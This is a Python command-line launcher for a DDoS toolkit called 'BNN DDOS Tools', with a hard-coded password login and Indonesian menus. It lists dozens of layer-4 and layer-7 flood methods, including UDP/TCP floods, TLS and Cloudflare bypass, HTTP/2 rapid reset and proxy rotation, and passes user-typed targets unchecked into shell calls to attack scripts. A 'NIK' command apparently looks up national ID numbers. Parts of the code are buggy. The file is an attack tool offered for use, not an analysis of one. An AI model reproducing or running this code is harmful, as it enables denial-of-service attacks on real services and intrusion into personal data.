# FIXXED BY @BOBBY
from operator import index
import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
import codecs
import string
import urllib
import getpass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
BNN DDOS Tools''')
    time.sleep(0.6)
    clear()
    print(f'''
LOADING⏳''')
    time.sleep(0.6)
    clear()
    print(f'''
LOADING⏳''')
    time.sleep(0.6)
    clear()
    print(f"""
SUCCES✅""")
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mbobby \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to bobby2 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @BNN \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")

def L4():
	os.system ("clear")
	print("""                          ⠀⠀⠀⠀⢀⠀⡤⢤⣀⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⠀⠈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠀⢤⡿⣥⡖⣲⣿⣿⣞⣁⣀⠴⢚⣿⠛⣷⡈⣆⠀⠱⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢰⡿⢛⣶⣿⣿⣿⠋⣹⣟⣁⣴⣾⠃⢀⡏⠇⠸⡀⠀⢱⠀⢈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣿⡇⡘⣾⣿⣿⡇⣸⡯⠽⠟⢋⣉⠑⡞⠀⡼⢠⢧⠀⠀⡇⠈⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠐⡿⢰⢁⡟⠀⠉⣰⠙⡿⣷⣶⢦⡄⢰⠁⢰⠃⣸⡌⠀⢸⠃⢀⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣷⢸⢸⢧⡰⢼⣿⡀⠉⠀⠈⠀⠀⠀⢧⢇⣸⣳⠁⡰⢃⠀⣸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢿⣿⡸⣼⡝⢦⠣⠁⠀⠀⠀⠀⠀⠀⠘⠙⠻⢥⠞⢁⠜⣰⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠈⢿⢿⣼⣇⠘⣧⡀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⣼⣧⣾⡷⠛⢿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠸⠺⣿⣿⣇⣿⠙⢦⡀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m
 ⠀⠀⠀⠀⠀⠀

\033[37m [ LAYER 4 ]
\033[35m NOTE USE:
TCP AWALAN IP PAKE http:// AKHIR /
STRESS MODE : 
 1.TCP
 2.UDP
 3.HTTP
METHODE  [IP] 

\033[37m
 – SAMP [IP] [PORT] [TIME] [THREAD]
 – UDP [IP] [PORT] [TIME] [PACKET] [THREAD]
 – TCP [IP] [PORT]
 – STRESS [IP] [PORT] [MODE] [TIME]
 

""")

def L7():
	os.system ("clear")
	print("""                              ⠀⠀⢀⠀⡤⢤⣀⣤⣀⡀⠀⠀
\033[1;34;40m ⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⠀⠈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠀⢤⡿⣥⡖⣲⣿⣿⣞⣁⣀⠴⢚⣿⠛⣷⡈⣆⠀⠱⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢰⡿⢛⣶⣿⣿⣿⠋⣹⣟⣁⣴⣾⠃⢀⡏⠇⠸⡀⠀⢱⠀⢈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣿⡇⡘⣾⣿⣿⡇⣸⡯⠽⠟⢋⣉⠑⡞⠀⡼⢠⢧⠀⠀⡇⠈⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠐⡿⢰⢁⡟⠀⠉⣰⠙⡿⣷⣶⢦⡄⢰⠁⢰⠃⣸⡌⠀⢸⠃⢀⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣷⢸⢸⢧⡰⢼⣿⡀⠉⠀⠈⠀⠀⠀⢧⢇⣸⣳⠁⡰⢃⠀⣸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢿⣿⡸⣼⡝⢦⠣⠁⠀⠀⠀⠀⠀⠀⠘⠙⠻⢥⠞⢁⠜⣰⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠈⢿⢿⣼⣇⠘⣧⡀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⣼⣧⣾⡷⠛⢿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠸⠺⣿⣿⣇⣿⠙⢦⡀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀

\033[37m [ LAYER 7 ]
\033[35m NOTE USE:
 METHODE  [URL]
 CONTOH :
\033[37m METHOD : GET/POST
\033[37m BRUTAL KHUSUS BOT DSTAT/DSTAT

\033[37m
 – XCDDOS [URL]
 – STRIKE [URL] [GET]
 – BROWSER [URL] [THREAD] [get/post] [second] [header.txt/nil]
 – HTTP-RAND [URL]] [TIME]
 – HTTPS-STORM [URL] [THREAD] [get/post] [second] [header.txt/nil]
 – UAM [URL] [TIME] [RATE] [THREAD] [PROXY]
 – TLS-BYPASS [URL] [TIME] [RPS] [THREAD]
 – BYPASS [URL] [TIME] [RATE] [THREAD] [PROXY]
 – TLSV2 [URL] [TIME] [RPS] [THREAD]
 – NOVA [URL] [TIME] [RATE] [THREAD] [PROXY]
 – TLZ [URL] [GET]
 – SOCKET [URL] [METHOD]
 – ZOXCV2 [URL] [RPS] [THREAD]
 – BOMB2 [URL] [METHOD]
 – BOMB3 [URL] [METHOD]
 – NULL [URL] [THREAD] [get/post] [second] [header.txt/nil]
 – CTI [URL] [METHOD] 
 – CTA [URL] [METHOD]
 – NIK [NIK] 
 – TEMP [CodeNegara]  [angka]
 – MIXBYPASS [URL] [TIME] [RATE] [THREAD] [PROXY]
 – BRUTAL [URL] [TIME]
 – CTIKILL [URL] [TIME] [RPS] [THREAD]
 – RAPID [url] [method]
 – HTTPS2 [url] 
 – HTTPS3 [url] [thread] [method] [time] 
 – CHROMEV3 [url] [time] [rps] [thread]
 – HTTPFLOOD [url] [thread] [method] [time]
 – TLZDDOS_SRV1 [url]
 – TLZDDOS_SRV2 [url]
 
""")

def MENU():
    sys.stdout.write(f"         \x1b]2;bobby2 --> Stars: [{bots}] | Online Users: [500] | Methods: [35] | Bypass: [29] | Amps: [14]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233miza \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to bobby2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @BNN \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.3')
    print("")
    print("""
\033[1;34;40m ⠀⠀⠀⠀⠀⠀⢀⣠⢶⠞⢩⣧⡨⠿⠿⢿⡝⠯⠛⠶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢀⣶⠟⠍⠁⢒⠿⡠⠖⠉⠉⢙⣷⠀⠀⠀⠈⠩⣲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠀⢤⡿⣥⡖⣲⣿⣿⣞⣁⣀⠴⢚⣿⠛⣷⡈⣆⠀⠱⡌⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢰⡿⢛⣶⣿⣿⣿⠋⣹⣟⣁⣴⣾⠃⢀⡏⠇⠸⡀⠀⢱⠀⢈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣿⡇⡘⣾⣿⣿⡇⣸⡯⠽⠟⢋⣉⠑⡞⠀⡼⢠⢧⠀⠀⡇⠈⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠐⡿⢰⢁⡟⠀⠉⣰⠙⡿⣷⣶⢦⡄⢰⠁⢰⠃⣸⡌⠀⢸⠃⢀⢾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⣷⢸⢸⢧⡰⢼⣿⡀⠉⠀⠈⠀⠀⠀⢧⢇⣸⣳⠁⡰⢃⠀⣸⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⢿⣿⡸⣼⡝⢦⠣⠁⠀⠀⠀⠀⠀⠀⠘⠙⠻⢥⠞⢁⠜⣰⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠈⢿⢿⣼⣇⠘⣧⡀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⣼⣧⣾⡷⠛⢿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\033[1;34;40m ⠀⠀⠀⠸⠺⣿⣿⣇⣿⠙⢦⡀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠋⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀




\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " MENU " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
""")

def main():
    MENU()
    while(True):
        cnc = input("root@narkoba:~# \x1b[1;37m\033[0m ")
        if cnc == "L7" or cnc == "l4":
            L7()
        elif cnc == "L4" or cnc == "l4":
             L4()

# LAYER 7 METHODS

        elif "TLZDDOS_SRV1" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run TLZDDOS.go -url {url} POST')
            except IndexError:
                print('Usage: TLZDDOS_SRV1 <url>')
                print('Example: TLZDDOS_SRV1 https://example.com POST')
                
        elif "TLZDDOS_SRV2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run TLZDDOS.go -url {url} GET')
            except IndexError:
                print('Usage: TLZDDOS_SRV2 <url> <method> GET')
                print('Example: TLZDDOS_SRV2 https://example.com GET')
                
        elif "XCDDOS" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run XCDDOS.go -url {url} GET')
            except IndexError:
                print('Usage: XCDDOS <url>')
                print('Example: XCDDOS https://example.com')
               
        elif "BRUTAL" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[1]
                
                os.system(f'cd godzilla && python3 input.py {url} {time}')
            except IndexError:
                print('Usage: BRUTAL <url> <time>')
                print('Example: BRUTAL https://example.com 300 ')
                
               
        elif "NIK" in cnc:
            try:
                nik = cnc.split()[1]
                
                os.system(f'nik-parse  -n {nik}')
            except IndexError:
                print('Usage: NIK <nik>')
                print('Example: NIK 9298293293')
                
        elif "TEMP" in cnc:
            try:
               url = cnc.split()[1]
               nik = cnc.split()[2]
                               
               os.system(f'cd godzilla && node index.js {url} 62')
            except IndexError:
                print('Usage: TEMP 62')
                print('Example: TEMP 62')
                                  
        elif "STRIKE" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run strike.go -url {url} GET')
            except IndexError:
                print('Usage: strike <url> <method> GET')
                print('Example: strike https://example.com GET')

        elif "TLZ" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
            except IndexError:
                print('Usage: TLZ <url> <method> GET')
                print('Example: TLZ https://example.com')
                
        elif "CTIKILL" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                
                os.system(f'cd godzilla && node CTIKILL.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: CTIKILL <url>  <time> <rps> <thread>')
                print('Example: CTIKILL https://example.com 500 50 1000')
                
        elif "CHROMEV3" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                
                os.system(f'cd godzilla && node CHROMEV3 {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: CHROMEV3 <url>  <time> <rps> <thread>')
                print('Example: CHROMEV3 https://example.com 500 50 1000')

        elif "ZOXCV2" in cnc:
            try:
                url = cnc.split()[1]
                rps = cnc.split()[2]
                thread = cnc.split()[3]
                
                os.system(f'cd godzilla && go run zoxcv2.go {url} {rps} {thread}')
            except IndexError:
                print('Usage: ZOXCV2 <url> <rps> <thread>')
                print('Example: ZOXCV2 https://example.com 50 1000')
                                   
        elif "HTTPS-STORM" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                
                os.system(f'cd godzilla && go run HTTPS-STORM.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: HTTPS-STORM <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: HTTPS-STORM https://example.com 500 <get/post> 125 <header.txt/nil')
        
        elif "BROWSER" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && go run BROWSER.go {url} {thread} {method} {second} {proxy}')
            except IndexError:
                print('Usage: BROWSER <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: BROWSER https://example.com 500 <get/post> 125 <header.txt/nil')
                
        elif "HTTPFLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'cd godzilla && go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: HTTPFLOOD <url> <threads> <get/post> <time>')
                print('Example: HTTPFLOOD https://example.com 500 <get/post 125')
              
        elif "STRESS" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'cd godzilla && go run stress.go {url} {port} {mode} 1250 {time} 5')
            except IndexError:
                print('Usage: STRESS <url> <threads> <method> <time>')
                print('Example: STRESS https://example.com 80 2 125 9')
                
        elif "NULL" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                second = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && go run Null.go {url} {thread} {method} {second} {proxy}')
            except IndexError:
                print('Usage: NULL <url> <threads> <get/post> <seconds> <header.txt/nil')
                print('Example: NULL https://example.com 500 <get/post> 125 <header.txt/nil')
                        
        elif "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                
                os.system(f'cd godzilla && node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: HTTP-RAND <url> <time>')
                print('Example: HTTP-RAND https://example.com 500')
                
        elif "STRESS" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'cd godzilla && go run stress .go {ip} {port} {method} 1250 {time} 5')
            except IndexError:
                print('Usage: STRESS <ip> <port>  <mode> <time>')
                print('Example: STRESS 1.1.1 22 3 200')
                
        elif "SAMP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                
                os.system(f'cd godzilla && python3 samp.py -i {ip} -p {port} -t {time} -th {thread}')
            except IndexError:
                print('Usage: SAMP <ip> <port> <time> <thread>')
                print('Example: SAMP 1.1.1 22 300 1250')
                
        elif "UDP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                packet = cnc.split()[4]
                thread = cnc.split()[5]
                
                os.system(f'cd godzilla && python3 UDP.py {ip} {port} {time} {packet} {thread}')
            except IndexError:
                print('Usage: UDP <ip> <port> <time> <packet> <thread>')
                print('Example: UDP 1.1.1 22 300 50 1250')
                
        elif "TCP" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                
                os.system(f'cd godzilla && node TCP.js {ip} {port} {time} {packet} {thread}')
            except IndexError:
                print('Usage: TCP <ip> <port>')
                print('Example: TCP 1.1.1 22')
  
        elif "Tls" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                
                os.system(f'cd godzilla && node Tlsv1 {url} {time} {time}')
            except IndexError:
                print('Usage: Tls <url> <time> <rps> <threads> <proxies.txt>')
                print('Example: Tls http://example.com 60 5000 500 proxies.txt')
                
        elif "HTTPS3" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'cd godzilla && go run BROWSER.go {url} {thread} {method} {time} nil')
                os.system(f'cd godzilla && go run HTTPS-STORM.go {url} {thread} {method} {time} nil')
                os.system(f'cd godzilla && go run Null.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: HTTPS3 <url> <thread> <method> <time>')
                print('Example: HTTPS3 https://example.com 300 get 500')
                
                
        elif "HTTPS2" in cnc:
            try:
                url = cnc.split()[1]
         
                os.system(f'cd godzilla && go run Hulk.go -site {url} -data GET')
                os.system(f'cd godzilla && go run strike.go -url [url] -method GET')
                os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
                os.system(f'cd godzilla && go run XCDDOS.go -site {url} -data GET')
                os.system(f'cd godzilla && go run Low.go -site {url} -data GET')
                os.system("clear")
            except IndexError:
                print('Usage: HTTPS2 <url> <method>')
                print('Example: HTTPS2 https://example.com GET')
                
        elif "RAPID" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run RAPID-RESET.go -site {url} -data {method}')
            except IndexError:
                print('Usage: RAPID-RESET <url> <method>')
                print('Example: RAPID-RESET https://example.com GET')
                

        elif "SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'cd godzilla && go run SOCKET.go -site {url} -data POST')
            except IndexError:
                print('Usage: SOCKET <url> <method>')
                print('Example: SOCKET https://example.com')

        elif "BOMB2" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'cd godzilla && go run Hulk.go -site {url} -data GET')
            except IndexError:
                print('Usage: BOMB2 <url> <method>')
                print('Example: BOMB2 https://example.com')

        elif "BOMB3" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'cd godzilla && go run Low.go -site {url} -data POST')
            except IndexError:
                print('Usage: BOMB3 <url> <method>')
                print('Example: BOMB3 https://example.com')
                
        elif "CTI" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'cd godzilla && go run CTI.go -site {url} -data GET')
            except IndexError:
                print('Usage: CTI <url> <method>')
                print('Example: CTI https://example.com')

        elif "CTA" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]

                os.system(f'cd godzilla && go run CTA.go -site {url} -data GET')
            except IndexError:
                print('Usage: CTA <url> <method>')
                print('Example: CTA https://example.com')
                
        elif "TLSV2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                
                os.system(f'cd godzilla && node tlsv2.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: tlsv2 <url> <time> <rps> <threads> <proxy.txt>')
                print('Example: tlsv2 http://example.com 60 5000 500 proxy.txt')
                
        elif "BOMB" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                rps = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node BOOMBER.js {url} {time} {thread} {rps} {proxy}')
            except IndexError:
                print('Usage: BOMB <url> <time> <thread> <rps> <proxy ')
                print('Example: BOMB https://example.com 60 10 50 http.txt')
                
        elif "MIXBYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node MIXBYPASS.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: MIXBYPASS <url> <time> <rate> <thread> <proxy> ')
                print('Example: MIXBYPASS https://example.com 60 10 50 proxy.txt')
               
        elif "UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rate = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node UAM.js {url} {time} {rate} {thread} {proxy}')
            except IndexError:
                print('Usage: UAM <url> <time> <rate> <thread> <proxy> ')
                print('Example: UAM https://example.com 60 10 50 proxies.txt')
                
        elif "TLS-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node TLS-BYPASS.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Example: TLS-BYPASS https://example.com 60 10 50 proxy.txt')
                
        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node BYPASS.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Example: node bypass.js target time rps(32) thread proxies.txt')
                
        elif "NOVA" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'cd godzilla && node novaria.js {url} {time} {rps} {thread} {proxy}')
            except IndexError:
                print('Example: node novaria.js target time rps(32) thread proxy.txt')
                

        elif "MODULES-UPDATE" in cnc:
            try:
                os.system(f'cd godzilla && node node_auto_install_modules.js HTTP-NIGGA.js 404.js anus.js MIX.js BYPASS.js')
            except IndexError:
                print('Usage: MODULES-UPDATE')
                print('Example: MODULES-UPDATE')	    

        elif "MENU" in cnc:
            print(f'''
L7 -> LAYER 7
L4 -> L4 LAYER 4 
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    os.system("clear")
    user = "root"
    passwd = "narkoba"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO DDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mSay No To Drugs""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO DDOS""")
        time.sleep(0.3)
    MENU()
    main()
    

login()
